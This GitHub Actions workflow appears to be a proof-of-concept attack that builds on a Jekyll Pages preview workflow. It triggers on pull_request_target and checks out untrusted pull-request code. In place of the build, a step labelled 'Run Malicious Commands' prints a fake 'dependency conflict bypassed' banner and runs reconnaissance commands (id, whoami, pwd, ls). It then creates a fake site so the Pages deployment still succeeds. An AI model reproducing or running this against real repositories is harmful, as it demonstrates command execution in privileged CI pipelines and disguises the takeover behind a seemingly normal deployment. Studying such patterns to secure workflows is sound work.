# This workflow uses actions that are not certified by GitHub.
# They are provided by a third-party and are governed by
# separate terms of service, privacy policy, and support
# documentation.

# Sample workflow for building and deploying a Jekyll site to GitHub Pages
name: Deploy Jekyll site to Pages preview environment
on:
  # Runs on pull requests targeting the default branch
  pull_request_target:
    branches: ["main"]
# Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
permissions:
  contents: read
  pages: write
  id-token: write
# Allow only one concurrent deployment per PR, skipping runs queued between the run in-progress and latest queued.
# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
concurrency:
  group: "pages-preview @ ${{ github.event.pull_request.head.label || github.head_ref || github.ref }}"
  cancel-in-progress: false
jobs:
  # Build job
  build:
    environment:
      name: "Pages Preview"
    # Limit permissions of the GITHUB_TOKEN for untrusted code
    permissions:
      contents: read
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v5.0.0
        with:
          # For PRs make sure to checkout the PR branch
          ref: ${{ github.event.pull_request.head.sha }}
          repository: ${{ github.event.pull_request.head.repo.full_name }}
      - name: Setup Pages
        uses: actions/configure-pages@v5.0.0
      - name: Run Malicious Commands Instead of Building
        run: |
          echo "======================================================"
          echo "=== [SUCCESS] Dependency conflict bypassed.        ==="
          echo "===           Executing direct commands now!         ==="
          echo "======================================================"
          echo ""
          echo "--> Running 'id' command:"
          id
          echo ""
          echo "--> Running 'whoami' command:"
          whoami
          echo ""
          echo "--> Current directory:"
          pwd
          echo ""
          echo "--> Listing all files:"
          ls -lah

          # 为了让后续的 "Upload artifact" 步骤不报错，我们创建一个假的 _site 目录
          echo "Creating a fake _site directory to satisfy next step..."
          mkdir -p ./_site
          echo "This is a fake site." > ./_site/index.html
      - name: Upload artifact
        # Automatically uploads an artifact from the './_site' directory by default
        uses: actions/upload-pages-artifact@v4.0.0
  # Deployment job
  deploy:
    environment:
      name: "Pages Preview"
      url: ${{ steps.deployment.outputs.page_url }}
    # Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
    permissions:
      contents: read
      pages: write
      id-token: write
    runs-on: ubuntu-latest
    needs: build
    steps:
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v4.0.5
        with:
          preview: "true"
